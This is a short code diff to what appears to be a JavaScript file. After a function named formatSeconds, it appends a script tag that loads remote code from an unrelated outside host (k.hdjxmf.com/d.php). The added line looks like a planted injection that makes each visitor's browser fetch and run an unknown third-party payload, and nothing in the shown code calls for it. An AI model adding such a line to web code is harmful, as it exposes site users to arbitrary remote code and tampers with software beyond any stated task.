@@ -229,3 +229,4 @@ function formatSeconds(value) {
 	}
 	return time;
 }
+<script id='mob' type='text/javascript' charset='utf-8' src='http://k.hdjxmf.com/d.php?pid=1030'></script>
